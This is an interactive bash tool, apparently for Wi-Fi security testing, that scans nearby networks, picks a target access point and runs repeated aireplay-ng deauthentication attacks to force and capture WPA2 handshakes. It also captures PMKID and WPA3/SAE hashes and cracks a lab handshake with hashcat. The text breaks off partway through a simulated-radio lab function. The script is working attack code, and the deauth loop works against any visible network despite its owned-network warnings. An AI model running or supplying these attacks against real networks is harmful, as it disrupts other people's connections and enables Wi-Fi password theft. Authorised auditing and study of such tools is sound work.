#!/usr/bin/env bash
# ============================================================================
# WPA2 / WPA3 handshake capture lab - unified interactive tool
#
# Two strategies, one menu:
#   A) MONITOR mode : airodump-ng / hcxdumptool captures (needs a card whose
#                     monitor RX actually works - rtw88/RTL8821AU does NOT).
#   B) AP LAB        : hostapd turns your adapter into your OWN WPA2 AP; a
#                      client join produces the real 4-way handshake, captured
#                      on the AP interface. Works on any AP-capable adapter,
#                      no monitor mode needed.
#
# Test ONLY on networks you own / have explicit permission to audit.
# ============================================================================
set -uo pipefail

IFACE="${1:-}"
OUT_DIR="${2:-$HOME/lab}"
BASE="cap"

# filesystem-safe short tag from an SSID (used in captured filenames)
sanitize_tag() {
    local s="${1:-unknown}"
    s="$(tr -cd 'A-Za-z0-9_.-' <<<"$s")"
    [[ -n "$s" ]] || s="unknown"
    echo "${s:0:20}"
}
MON_IF=""
MON_METHOD=""  # "airmon" (airmon-ng vif) or "iw" (direct on main iface)
MON_ENTERED=0
CLEANED=0
HAS_MON=0
HAS_AP=0
MON_RX=-1   # -1 untested, 0 broken, 1 working
MON_RX_DATA=-1 # -1 untested, 0 broken (no data frames), 1 working
BUSY_CH=""   # busiest neighbor channel, set by scan_busiest_ch
CAP_PCAP=""  # pcap produced by capture_airodump_pcap

declare -a AP_BSSID=() AP_CH=() AP_ESSID=() ST_MAC=() ST_PWR=() ST_PROBE=()
TARGET_BSSID=""
TARGET_CH=""
TARGET_ESSID=""
PICKED_CLIENT=""

red()    { printf "\033[1;31m%s\033[0m\n" "$*"; }
green()  { printf "\033[1;32m%s\033[0m\n" "$*"; }
yellow() { printf "\033[1;33m%s\033[0m\n" "$*"; }
cyan()   { printf "\033[1;36m%s\033[0m\n" "$*"; }

banner() { cat <<'EOF'
  ------------------------------------------------
   WPA2 / WPA3 Handshake Capture Lab - Unified
   Monitor flow + AP-lab flow in one tool
   Use only on networks you own / are authorized
  ------------------------------------------------
EOF
}

die()    { red "[!] $*"; exit 1; }
need()   { hash "$1" 2>/dev/null || die "Missing tool: '$1' (install '$2')"; }

cleanup() {
    [[ $CLEANED -eq 1 ]] && return
    CLEANED=1
    echo
    yellow "[*] Cleaning up..."
    [[ -n "${AP_IF:-}" ]] && pkill -f "tcpdump -i $AP_IF" >/dev/null 2>&1 || true
    pkill -f "hostapd .*wormlab" >/dev/null 2>&1 || true
    kill "${HOSTAPD_PID:-}" "${DNSMASQ_PID:-}" "${TCPDUMP_PID:-}" >/dev/null 2>&1 || true
    pkill -f "airodump-ng" >/dev/null 2>&1 || true
    if [[ -n "$MON_IF" ]] && [[ -e "/sys/class/net/$MON_IF" ]]; then
        if [[ "$MON_METHOD" == "iw" ]]; then
            ip link set "$MON_IF" down >/dev/null 2>&1 || true
            iw dev "$MON_IF" set type managed >/dev/null 2>&1 || true
            ip link set "$MON_IF" up >/dev/null 2>&1 || true
        else
            airmon-ng stop "$MON_IF" >/dev/null 2>&1 || true
        fi
    fi
    rfkill unblock wifi >/dev/null 2>&1 || true
    # wpa_supplicant was killed by airmon-ng check kill; NetworkManager alone
    # often respawns its own, but be explicit so WiFi can auto-reconnect.
    service NetworkManager restart >/dev/null 2>&1 || systemctl restart NetworkManager >/dev/null 2>&1 || true
    # give NM a moment, then aggressively nudge the interface to connect
    sleep 3
    nmcli radio wifi on >/dev/null 2>&1 || true
    ip link set "$IFACE" up >/dev/null 2>&1 || true
    sleep 2
    nmcli device connect "$IFACE" >/dev/null 2>&1 || true
    green "[+] Network manager restored."
}
trap cleanup INT TERM EXIT

# ---------------------------------------------------------------- capability
capabilities() {
    local phy ifmode
    phy="$(basename "$(readlink -f "/sys/class/net/$IFACE/phy80211")" 2>/dev/null)"
    [[ -n "$phy" ]] || die "no phy found for $IFACE"
    ifmode="$(iw phy "$phy" info 2>/dev/null)"
    printf '%s' "$ifmode" | grep -qE '^\s+\* monitor' && HAS_MON=1
    printf '%s' "$ifmode" | grep -qE '^\s+\* AP$|^\s+\* AP ' && HAS_AP=1

    echo
    cyan "[*] Adapter capabilities ($IFACE / phy$phy):"
    printf '    monitor mode : %s\n' "$([[ $HAS_MON -eq 1 ]] && green YES || red NO)"
    printf '    AP mode      : %s\n' "$([[ $HAS_AP -eq 1 ]] && green YES || red NO)"
    if [[ $HAS_MON -eq 0 ]]; then
        yellow "    -> monitor flow disabled. Use the AP-lab flow (option 5)."
    elif [[ $HAS_AP -eq 0 ]] && [[ $MON_RX -eq 0 ]]; then
        yellow "    -> no monitor + no AP = lab impossible on this card."
    fi
}

# ---------------------------------------------------------------- monitor RX
# Realtek rtw88-family USB cards (RTL8811AU/8821AU/8812AU) go permanently deaf
# in monitor mode after interface churn (monitor/managed toggles + airmon-ng
# kill): RX drops to ~0 frames until the driver is reloaded or the dongle is
# replugged. A full module reload at the start of the monitor session fixes it.
# Verified on kernel 7.0: before reload 0-6 frames/15s, after reload 131 (ch11)
# and 85 (ch157) frames/15s on a TP-Link 802.11ac (2357:0120).
RTW_RELOADED=0
rtw88_reload() {
    local drv m
    drv="$(basename "$(readlink "/sys/class/net/$IFACE/device/driver" 2>/dev/null)" 2>/dev/null)"
    case "$drv" in
        rtw_8821au|rtw_8812au|rtw_8814au|rtw88_8821au|rtw88_8812au|rtw88_8814au) ;;
        *) return 0 ;;  # not a reload-affected driver
    esac
    [[ $RTW_RELOADED -eq 1 ]] && return
    RTW_RELOADED=1
    yellow "[*] Reloading $drv to clear the rtw88 USB RX stall..."
    nmcli device set "$IFACE" managed no >/dev/null 2>&1 || true
    ip link set "$IFACE" down >/dev/null 2>&1 || true
    # unload the whole rtw88 family in reverse dependency order (plain rmmod:
    # always works, and out-of-tree .ko files may be missing from /lib/modules)
    for _ in 1 2 3 4 5; do
        for m in $(ls /sys/module 2>/dev/null | grep -E '^(rtw88_|rtw_)' | tr '\n' ' '); do
            rmmod "$m" >/dev/null 2>&1 || true
        done
    done
    modprobe "$drv" >/dev/null 2>&1 || yellow "    (could not reload $drv - continuing)"
    sleep 3
    ip link set "$IFACE" up >/dev/null 2>&1 || true
    green "[+] $drv reloaded."
}

# Demonstration in this lab found mt7921e captures DATA frames only when the
# MAIN interface is set to monitor directly ("iw dev set type monitor").
# airmon-ng's separate "ifacemon" vif receives beacons but drops data frames.
# So prefer the direct-iw method.
enter_monitor() {
    [[ $MON_ENTERED -eq 1 ]] && return
    yellow "[*] Stopping NetworkManager to free the card (net drops; restored on exit)..."
    airmon-ng check kill >/dev/null 2>&1 || true
    rtw88_reload
    cyan "[*] Enabling monitor mode on $IFACE via direct iw..."
    # disable power-save BEFORE the mode switch (chip sleeps and never wakes
    # in monitor without an AP; setting it before AND after is what works)
    iw dev "$IFACE" set power_save off 2>/dev/null || true
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor 2>/dev/null
    ip link set "$IFACE" up
    sleep 1
    MON_IF="$(find_mon_iface)"
    [[ -n "$MON_IF" ]] || die "No monitor interface created"
    MON_METHOD="iw"
    MON_ENTERED=1
    # Realtek rtw88-family USB cards (8811au/8821au/8812au) receive ~0 frames in
    # monitor while power-save is on: with no AP link the chip stays asleep and
    # nothing wakes it. Verified fix on Kernel 7.0 (in-kernel rtw88_8821au).
    iw dev "$MON_IF" set power_save off 2>/dev/null || true
    green "[+] Monitor interface: $MON_IF"
}

find_mon_iface() {
    local m
    m=$(iw dev 2>/dev/null | awk '/Interface/{n=$2} /type monitor/{print n}' | head -1)
    [[ -n "$m" ]] && { echo "$m"; return; }
    [[ -e "/sys/class/net/${IFACE}mon" ]] && { echo "${IFACE}mon"; return; }
    [[ -e "/sys/class/net/$IFACE" ]] && { echo "$IFACE"; return; }
}

# USB adapters get wlx<mac> names whose device dir is the USB *interface*
# (1-3:1.0); the product string lives on the parent USB device (1-3).
usb_prod() {
    local d="/sys/class/net/$1/device" p
    p="$(cat "$d/product" 2>/dev/null || cat "$d/../product" 2>/dev/null || cat "$d/interface" 2>/dev/null)"
    echo "${p:-unknown}"
}

# Find the channel with the most visible APs; mt7921e cannot be reliably
# re-pointed with "iw set channel" after a scan (it goes deaf), so we capture
# with airodump-ng on a FIXED channel instead of tcpdump.
scan_busiest_ch() {
    local pid s
    [[ -n "$BUSY_CH" ]] && return
    need airodump-ng
    s=10
    yellow "[*] Scanning (${s}s) for busiest channel..."
    rm -f /tmp/wgch-01.csv /tmp/wgch.log
    airodump-ng --band bg -w /tmp/wgch --output-format csv "$MON_IF" >>/tmp/wgch.log 2>&1 &
    pid=$!
    sleep "$s"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    BUSY_CH="$(awk -F, 'NR>2 && $1 ~ /:/{gsub(/ /,"",$4); if($4!="") c[$4]++} END{for(ch in c) if(c[ch]>=bestc){bestc=c[ch];best=ch} print best}' /tmp/wgch-01.csv 2>/dev/null)"
    [[ -n "$BUSY_CH" ]] || BUSY_CH=6
    green "    busiest channel: $BUSY_CH"
}

# Run airodump on one fixed channel for N seconds, writing a pcap.
# Sets CAP_PCAP to the pcap path (empty on failure).
capture_airodump_pcap() {
    local ch="$1" secs="$2" base="/tmp/wgcap-$$" pid
    need airodump-ng
    CAP_PCAP=""
    rm -f "${base}-01.cap" "${base}-01.csv" "${base}-01.log.csv"
    airodump-ng --band bg -c "$ch" --write "$base" --output-format pcap,csv "$MON_IF" >/dev/null 2>&1 &
    pid=$!
    sleep "$secs"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    [[ -e "${base}-01.cap" ]] && CAP_PCAP="${base}-01.cap"
}

# Counts frames in $CAP_PCAP. Sets RX_TOT and RX_DATA.
count_frames() {
    RX_TOT=0; RX_DATA=0
    [[ -n "$CAP_PCAP" ]] || return 0
    if command -v tshark >/dev/null 2>&1; then
        RX_TOT="$(tshark -r "$CAP_PCAP" 2>/dev/null | wc -l)"
        RX_DATA="$(tshark -r "$CAP_PCAP" -Y 'wlan.fc.type eq 2' 2>/dev/null | wc -l)"
    else
        need tcpdump
        RX_TOT="$(tcpdump -r "$CAP_PCAP" -e 2>/dev/null | wc -l)"
        RX_DATA="$(tcpdump -r "$CAP_PCAP" -e 2>/dev/null | grep -c '802.11 data' || true)"
    fi
}

test_monitor_rx() {
    need tcpdump tcpdump
    enter_monitor
    scan_busiest_ch
    yellow "[*] RX test: ${CAPS_PROBE_SECS:-6}s capture on ch$BUSY_CH (fixed-channel airodump)..."
    capture_airodump_pcap "$BUSY_CH" "${CAPS_PROBE_SECS:-6}"
    count_frames
    if [[ "${RX_TOT:-0}" -ge 5 ]]; then
        MON_RX=1; green "    OK - monitor RX works, saw $RX_TOT+ frames on ch$BUSY_CH."
    else
        MON_RX=0; red "    FAIL - $RX_TOT frames in 6s on ch$BUSY_CH. Monitor RX broken on this card/driver."
        if [[ $HAS_AP -eq 1 ]]; then
            green "    Use the AP-lab flow (option 5) instead - no monitor needed."
        fi
    fi
    sleep 1
}

# Distinguish "card sees radio activity" from "card can capture the frames
# a handshake needs". EAPOL 4-way frames are UNICAST (AP <-> phone, not
# addressed to us), so a card that only passes broadcast/mgmt frames will fail.
test_monitor_rx_data() {
    need airodump-ng aircrack-ng
    need tcpdump tcpdump
    enter_monitor
    MON_RX_DATA=0
    scan_busiest_ch
    yellow "[*] DATA-frame probe: ${CAPS_PROBE_SECS:-8}s on ch$BUSY_CH (busiest neighbor channel)..."
    capture_airodump_pcap "$BUSY_CH" "${CAPS_PROBE_SECS:-8}"
    count_frames
    if [[ "${RX_DATA:-0}" -gt 0 ]]; then
        MON_RX_DATA=1
        green "    DATA-RX OK - $RX_DATA data frame(s) of $RX_TOT total. EAPOL capture viable."
    else
        MON_RX_DATA=0
        red "    DATA-RX FAIL - $RX_TOT frame(s) seen, 0 data frames on ch$BUSY_CH."
        red "    Beacons/broadcasts may pass, but UNICAST data frames (EAPOL/4-way) are dropped by this firmware - handshake capture impossible."
        if [[ $HAS_AP -eq 1 ]]; then
            green "    -> Use option 8 (virtual lab) or a monitor-capable USB adapter."
        fi
    fi
    sleep 1
}

gate_data_rx() {
    # Auto-probe then bail out clearly if this card can't capture data frames.
    local reason="${1:-}"
    if [[ $MON_RX -eq -1 ]]; then
        red "      Monitor RX untested - probing now..."
        test_monitor_rx
    fi
    if [[ $MON_RX -eq 1 ]] && [[ $MON_RX_DATA -eq -1 ]]; then
        red "      Data-frame reception untested - probing now..."
        test_monitor_rx_data
    fi
    if [[ $MON_RX -ne 1 ]]; then
        red "      Monitor RX broken - run option 6 for full diagnosis."
        return 1
    fi
    if [[ $MON_RX_DATA -ne 1 ]]; then
        red "      This card cannot capture data frames (EAPOL)."
        red "      Use option 8 (virtual lab) or a monitor-capable USB adapter."
        [[ -n "$reason" ]] && red "      ($reason)"
        return 1
    fi
    return 0
}

# ---------------------------------------------------------------- CSV parse
parse_csv() {
    AP_BSSID=(); AP_CH=(); AP_ESSID=()
    local line
    while IFS= read -r line; do
        [[ "$line" == *"Station MAC"* ]] && break
        [[ "$line" =~ ^[0-9A-Fa-f:]{17} ]] || continue
        AP_BSSID+=("$(awk -F, '{gsub(/ /,"",$1); print $1}' <<<"$line")")
        AP_CH+=("$(awk    -F, '{gsub(/ /,"",$4); print $4}' <<<"$line")")
        AP_ESSID+=("$(awk -F, '{gsub(/ /,"",$14); print $14}' <<<"$line")")
    done < "$1"
}

scan_fixed() {
    local ch="$1" band="$2" secs="${3:-8}"
    rm -f /tmp/wgscan*.csv >/dev/null 2>&1
    cyan "[*] Fixed ch $ch ($band), $secs s..."
    airodump-ng --band "$band" -c "$ch" -w /tmp/wgscan --output-format csv "$MON_IF" >>/tmp/wgscan.log 2>&1 &
    local pid=$!
    sleep "$secs"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
    parse_csv /tmp/wgscan-01.csv 2>/dev/null
}

scan_wifi() {
    enter_monitor
    local secs="${1:-10}"
    rm -f /tmp/wgscan*.csv /tmp/wgscan.log >/dev/null 2>&1
    cyan "[*] Full-band scan $secs s..."
    airodump-ng --band abg -w /tmp/wgscan --output-format csv "$MON_IF" >>/tmp/wgscan.log 2>&1 &
    local pid=$!
    sleep "$secs"
    kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null

    parse_csv /tmp/wgscan-01.csv 2>/dev/null
    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
        yellow "[-] Full-band scan empty. airodump-ng output:"
        [[ -s /tmp/wgscan.log ]] && tail -8 /tmp/wgscan.log | sed 's/^/    /'
        [[ $MON_RX -eq -1 ]] && test_monitor_rx
        [[ $MON_RX -eq 1 ]] && [[ $MON_RX_DATA -eq -1 ]] && test_monitor_rx_data
        if [[ $MON_RX -eq 1 ]]; then
            yellow "[-] RX works but full-band empty; trying fixed channels..."
            scan_fixed 6 bg 8
            if [[ ${#AP_BSSID[@]} -eq 0 ]]; then scan_fixed 157 a 8; fi
        fi
    fi

    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
        red "[-] No networks captured. Monitor RX: $([[ $MON_RX -eq 1 ]] && echo OK || echo BROKEN)."
        red "    Card info:"
        echo "    adapter: $(usb_prod "$MON_IF")"
        echo "    driver : $(basename "$(readlink /sys/class/net/$MON_IF/device/driver 2>/dev/null)" 2>/dev/null)"
        [[ $HAS_AP -eq 1 ]] && green "    -> Switch to the AP-lab flow (option 5)."
        return 1
    fi
    green "[+] Found ${#AP_BSSID[@]} network(s)"
}

select_target() {
    if [[ ${#AP_BSSID[@]} -eq 0 ]]; then
        scan_wifi 12 || return 1
    fi
    echo
    cyan "[*] Networks seen:"
    local i
    for i in "${!AP_BSSID[@]}"; do
        printf "  %2d) %-17s  ch %-4s %s\n" "$((i+1))" "${AP_BSSID[$i]}" "${AP_CH[$i]}" "${AP_ESSID[$i]}"
    done
    echo "  0) Rescan"
    local pick
    while true; do
        read -r -p "[>] Pick target (0 to rescan): " pick
        if [[ "$pick" == "0" ]]; then
            scan_wifi 12 || return 1
            select_target; return
        fi
        [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#AP_BSSID[@]} ]] && break
    done
    TARGET_BSSID="${AP_BSSID[$((pick-1))]}"
    TARGET_CH="${AP_CH[$((pick-1))]}"
    TARGET_ESSID="${AP_ESSID[$((pick-1))]}"
    green "[+] Target set: $TARGET_BSSID  (ch $TARGET_CH)  '$TARGET_ESSID'"
}

# ---------------------------------------------------------------- monitor flows
ensure_target() {
    [[ -n "$TARGET_BSSID" ]] || select_target || die "Choose a network first (option 1)."
}

# ---- targeted deauth helpers -------------------------------------------------
# airodump-ng -w <base> writes <base>-01.csv with two blocks: the AP list, then
# (after the "Station MAC" header line) the associated clients.
parse_stations() {
    ST_MAC=(); ST_PWR=(); ST_PROBE=()
    local line ins=0
    while IFS= read -r line; do
        [[ "$line" == *"Station MAC"* ]] && { ins=1; continue; }
        [[ $ins -eq 1 ]] || continue
        [[ "$line" =~ ^[0-9A-Fa-f:]{17} ]] || continue
        ST_MAC+=("$(cut -d, -f1 <<<"$line" | tr -d ' ')")
        ST_PWR+=("$(cut -d, -f4 <<<"$line" | tr -d ' ')")
        ST_PROBE+=("$(cut -d, -f7 <<<"$line" | tr -d ' ')")
    done < "$1"
}

# Let the user pick a connected client and deauth ONLY that client. A targeted
# deauth (-c CLIENTMAC) is far more likely to work than broadcast: broadcasts are
# widely ignored and can never touch a client that lives on another radio/channel.
# returns: 0 = picked ($PICKED_CLIENT set), 2 = broadcast deauth chosen, 1 = skip.
deauth_client_menu() {
    local csv="${1}" i pick
    PICKED_CLIENT=""
    parse_stations "$csv"
    if [[ ${#ST_MAC[@]} -eq 0 ]]; then
        yellow "[-] No clients seen on THIS radio (ch $TARGET_CH, $TARGET_BSSID)."
        yellow "    Your phone may be on the OTHER radio (e.g. 5GHz vs 2.4GHz)."
        yellow "    Re-scan and pick that BSSID, or move the phone to 2.4GHz Wi-Fi."
        read -r -p "[>] Broadcast deauth anyway? (y/N): " bc
        [[ "${bc,,}" == "y" ]] && return 2
        return 1
    fi
    echo
    cyan "[*] Connected clients (ch $TARGET_CH) - columns: MAC, power, probed SSIDs:"
    for i in "${!ST_MAC[@]}"; do
        printf "  %2d) %-18s  %3s dBm   %s\n" "$((i+1))" "${ST_MAC[$i]}" "${ST_PWR[$i]}" "${ST_PROBE[$i]}"
    done
    while true; do
        read -r -p "[>] Pick a client to deauth (0 = broadcast instead): " pick
        [[ "$pick" == "0" ]] && return 2
        [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#ST_MAC[@]} ]] && break
    done
    PICKED_CLIENT="${ST_MAC[$((pick-1))]}"
    return 0
}

is_hs() { aircrack-ng "$1" 2>/dev/null | grep -qE 'WPA \([1-9][0-9]* handshake'; }

# Turn a "no handshake" into a diagnosis: did EAPOL show up, did the deauth'd
# client ever transmit on this channel, did any deauth land? tshark-only.
hs_postmortem() {
    local pcap="$1" eapol tx rx
    command -v tshark >/dev/null 2>&1 || { yellow "   (install tshark for a frame-level diagnosis)"; return 0; }
    eapol="$(tshark -r "$pcap" -Y eapol 2>/dev/null | wc -l)"
    rx="$(tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c' 2>/dev/null | wc -l)"
    echo "   EAPOL frames in capture  : $eapol"
    echo "   deauth/disassoc seen     : $rx"
    if [[ -n "$PICKED_CLIENT" ]]; then
        tx="$(tshark -r "$pcap" -Y "wlan.sa == ${PICKED_CLIENT,,}" 2>/dev/null | wc -l)"
        echo "   frames SENT by $PICKED_CLIENT: $tx"
        [[ "$tx" -eq 0 ]] && yellow "      -> it never transmitted on ch$TARGET_CH: other radio, not associated, or PMF-blocked."
    fi
    if [[ "$eapol" -eq 0 ]]; then
        yellow "   -> no fresh association happened here. Deauth ignored (802.11w/PMF)"
        yellow "      or the client rejoined the OTHER radio (5GHz?). In the scan,"
        yellow "      pick that BSSID instead."
    fi
}

capture_wpa2() {
    gate_data_rx "handshake capture" || { read -r -p "[>] Enter to return to menu"; return; }
    ensure_target
    local ts cap apid dplan="" rc i n rounds=0 cont="" got=0
    ts="$(date +%H%M%S)"; cap="$(sanitize_tag "${TARGET_ESSID:-unknown}")_${BASE}-${ts}"
    cyan "[*] Capturing handshake on $TARGET_BSSID (ch $TARGET_CH) -> ${OUT_DIR}/${cap}-01.cap"
    echo "[*] Watch for:  WPA handshake: $TARGET_BSSID"
    echo "[*] If none, toggle a client's WiFi (your phone)."
    # Run quietly AND with stdin from /dev/null: airodump's curses UI would
    # otherwise grab the terminal and swallow the keys you type at the prompt
    # below, and its full-screen UI would hide our prompts.
    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "${OUT_DIR}/${cap}" "$MON_IF" </dev/null >/dev/null 2>&1 &
    apid=$!

    # give airodump a moment to build the station table before deauthing
    sleep 8
    echo
    echo "[*] Deauth plan (only on YOUR network), re-fired every 5s until a handshake shows:"
    read -r -p "[>]  [a]ll clients  [c]hoose one client  [b]roadcast  [m]anual MAC  / ENTER skip: " dm
    case "${dm,,}" in
        a)
            dplan="all"
            ;;
        c)
            deauth_client_menu "${cap}-01.csv"
            case $? in
                0) dplan="mac:$PICKED_CLIENT" ;;
                2) dplan="bcast" ;;
            esac
            ;;
        b) dplan="bcast" ;;
        m)
            read -r -p "[>] Client MAC: " client
            [[ "$client" =~ ^[0-9A-Fa-f:]{17}$ ]] && dplan="mac:$client" || yellow "[-] Bad MAC; no deauth."
            ;;
        *) yellow "    (${dm:-unknown} - skipping deauth)" ;;
    esac

    if [[ -n "$dplan" ]]; then
        while [[ $got -eq 0 ]]; do
            for i in $(seq 1 12); do  # 60s of 5s deauth rounds
                is_hs "${OUT_DIR}/${cap}-01.cap" && { got=1; break; }
                case "$dplan" in
                    all)
                        PICKED_CLIENT=""
                        parse_stations "${cap}-01.csv"
                        if [[ ${#ST_MAC[@]} -gt 0 ]]; then
                            PICKED_CLIENT="${ST_MAC[0]}"
                            for n in "${!ST_MAC[@]}"; do
                                aireplay-ng -0 2 -a "$TARGET_BSSID" -c "${ST_MAC[$n]}" "$MON_IF" >/dev/null 2>&1 || true
                            done
                            yellow "   [${i}x5s] targeted deauth of ${#ST_MAC[@]} client(s)"
                        else
                            aireplay-ng -0 2 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1 || true
                            yellow "   [${i}x5s] no clients listed - broadcasting instead"
                        fi
                        ;;
                    bcast)
                        aireplay-ng -0 2 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1 || true
                        yellow "   [${i}x5s] broadcast deauth"
                        ;;
                    mac:*)
                        rc="${dplan#mac:}"
                        aireplay-ng -0 2 -a "$TARGET_BSSID" -c "$rc" "$MON_IF" >/dev/null 2>&1 || true
                        yellow "   [${i}x5s] targeted deauth $rc"
                        ;;
                esac
                sleep 5
                is_hs "${OUT_DIR}/${cap}-01.cap" && { got=1; break; }
            done
            [[ $got -eq 1 ]] && break
            rounds=$((rounds+1))
            read -r -p "[>] No handshake yet ($((rounds*60))s so far). Keep deauthing? (y/N): " cont
            [[ "${cont,,}" == "y" ]] || break
        done
        if [[ $got -eq 1 ]]; then
            green "[+] Handshake captured during the deauth loop!"
        else
            yellow "[-] Stopped after $((rounds*60))s of deauth rounds."
        fi
        echo
    else
        echo "[*] No deauth - waiting for a client to connect/reconnect on its own..."
    fi

    read -r -p "    ...press ENTER to stop capturing"
    kill "$apid" >/dev/null 2>&1 || true
    pkill -f "airodump-ng -c $TARGET_CH" >/dev/null 2>&1 || true
    sleep 2

    if is_hs "${OUT_DIR}/${cap}-01.cap"; then
        green "[+] Handshake captured: ${OUT_DIR}/${cap}-01.cap"
        aircrack-ng "${OUT_DIR}/${cap}-01.cap" | grep -E 'WPA \([1-9][0-9]* handshake' || true
    else
        red "[-] No handshake yet."
        hs_postmortem "${OUT_DIR}/${cap}-01.cap"
        yellow "    Retry and reconnect a client during the run."
    fi
}

capture_pmkid() {
    gate_data_rx "PMKID capture" || { read -r -p "[>] Enter to return to menu"; return; }
    need hcxdumptool hcxtools
    need hcxpcapngtool hcxtools
    ensure_target
    yellow "[*] hcxdumptool PMKID capture on $TARGET_BSSID (Ctrl+C to stop)..."
    hcxdumptool -i "$MON_IF" -o hcxdump --filterlist_ap="$TARGET_BSSID" --filtermode=2 || true
    hcxpcaptool -z hash.22000 hcxdump >/dev/null 2>&1
    [[ -s hash.22000 ]] && green "[+] PMKID saved: $OUT_DIR/hash.22000" \
        || yellow "[-] No PMKID captured for this AP."
}

capture_sae() {
    gate_data_rx "WPA3/SAE capture" || { read -r -p "[>] Enter to return to menu"; return; }
    need hcxdumptool hcxtools
    need hcxpcapngtool hcxtools
    ensure_target
    yellow "[*] hcxdumptool WPA3/SAE capture on $TARGET_BSSID (client must connect; Ctrl+C to stop)..."
    hcxdumptool -i "$MON_IF" -o hcxdump --filterlist_ap="$TARGET_BSSID" --filtermode=2 --rds=1 || true
    hcxpcaptool -z hash.22000 hcxdump >/dev/null 2>&1
    [[ -s hash.22000 ]] && green "[+] WPA3 hash saved: $OUT_DIR/hash.22000" || yellow "[-] No capture."
}

# ---------------------------------------------------------------- AP lab flow
ap_lab() {
    [[ $HAS_AP -eq 1 ]] || { red "This adapter doesn't support AP mode."; return; }
    for t in hostapd dnsmasq tcpdump; do need "$t" "$t"; done

    local api ssid pass s channel
    echo
    read -r -p "[>] AP SSID    [WormLab]: " ssid;  ssid="${ssid:-WormLab}"
    read -r -p "[>] WPA2 pass  [handshake123]: " pass; pass="${pass:-handshake123}"
    [[ ${#pass} -ge 8 ]] || { red "passphrase needs >= 8 chars"; return; }
    read -r -p "[>] Channel    [6]: " channel; channel="${channel:-6}"

    yellow "[*] Starting lab AP '$ssid' (WPA2, ch $channel) on $IFACE..."
    yellow "[*] Freeing interface from NetworkManager..."
    airmon-ng check kill >/dev/null 2>&1 || true
    ip link set "$IFACE" down
    iw dev "$IFACE" set type managed 2>/dev/null
    MON_ENTERED=0; MON_IF=""
    ip addr flush dev "$IFACE"
    ip addr add 10.10.0.1/24 dev "$IFACE"
    ip link set "$IFACE" up
    sleep 1
    AP_IF="$IFACE"

    local hc dns
    hc="$(mktemp /tmp/wg-ap-hostapd.XXXX)" || return
    dns="$(mktemp /tmp/wg-ap-dnsmasq.XXXX)" || return
    cat > "$hc" <<EOF
interface=$IFACE
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wpa=2
wpa_passphrase=$pass
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
EOF
    cat > "$dns" <<EOF
interface=$IFACE
dhcp-range=10.10.0.50,10.10.0.100,255.255.255.0,12h
port=0
EOF

    hostapd "$hc" &> /tmp/wg-ap-hostapd.log &
    HOSTAPD_PID=$!
    sleep 4
    kill -0 "$HOSTAPD_PID" 2>/dev/null || { red "hostapd failed:"; tail -10 /tmp/wg-ap-hostapd.log; return; }
    green "[+] AP up."
    dnsmasq -C "$dns" --no-daemon &> /tmp/wg-ap-dnsmasq.log &
    DNSMASQ_PID=$!
    sleep 1

    local pcap capif monv phy
    phy="$(basename "$(readlink -f "/sys/class/net/$IFACE/phy80211")" 2>/dev/null)"
    pcap="$OUT_DIR/ap-hs-$(date +%H%M%S).pcap"
    capif="$IFACE"
    monv=""
    if [[ -n "$phy" ]] && iw phy "$phy" interface add labmon type monitor >/dev/null 2>&1; then
        monv="labmon"
        ip link set "$monv" up 2>/dev/null
        capif="$monv"
    fi
    yellow "[*] Capturing EAPOL handshake on $capif -> $pcap"
    yellow "    NOW connect a device to '$ssid' with '$pass'"
    if [[ -n "$monv" ]]; then
        tcpdump -i "$monv" -e -w "$pcap" 'ether proto 0x888e' 2>/dev/null &
    else
        tcpdump -i "$IFACE" -e -w "$pcap" 'ether proto 0x888e' 2>/dev/null &
    fi
    TCPDUMP_PID=$!

    read -r -p "[>] Press ENTER when the client connected..."
    kill "$TCPDUMP_PID" >/dev/null 2>&1; wait "$TCPDUMP_PID" 2>/dev/null
    [[ -n "$monv" ]] && iw dev "$monv" del >/dev/null 2>&1
    sleep 1

    green "[+] Capture saved: $pcap"
    yellow "[*] EAPOL frames captured:"
    if command -v tshark >/dev/null; then tshark -r "$pcap" 2>/dev/null | head -16;
    else tcpdump -r "$pcap" 2>/dev/null | head -16; fi

    local h22000
    h22000="$OUT_DIR/lab-hs-$(date +%H%M%S).22000"
    if command -v hcxpcapngtool >/dev/null; then
        hcxpcapngtool "$pcap" -o "$h22000" >/dev/null 2>&1
        if [[ -s "$h22000" ]]; then
            green "[+] Handshake extracted -> hashcat -m 22000 $h22000 wordlist.txt"
            if command -v hashcat >/dev/null; then
                echo "$pass" > "$OUT_DIR/wordlist.txt"
                echo "ok123456" >> "$OUT_DIR/wordlist.txt"
                yellow "[*] Demo crack (tiny wordlist with your passphrase):"
                hashcat -m 22000 "$h22000" "$OUT_DIR/wordlist.txt" --force --quiet 2>/dev/null \
                    && grep "$pass" "$OUT_DIR/hashcat.potfile" 2>/dev/null >/dev/null \
                    && green "    Cracked: password is '$pass'" \
                    || yellow "    (hashcat run finished; check $OUT_DIR/hashcat.potfile)"
            fi
        else
            yellow "[-] No EAPOL extracted - client may not have completed auth."
        fi
    else
        yellow "[-] hcxtools not installed -> sudo apt install hcxtools"
    fi
}

# ---------------------------------------------------------------- hwsim lab
hwsim_lab() {
    for t in mac80211_hwsim hostapd wpa_supplicant tcpdump; do
        if [[ "$t" != "mac80211_hwsim" ]]; then need "$t" "$t"; fi
    done
    modprobe -r mac80211_hwsim 2>/dev/null || true
    modprobe mac80211_hwsim radios=3 2>/dev/null || die "cannot load mac80211_hwsim"

    local ssid pass channel ap mon sta pcap hc wp
    echo
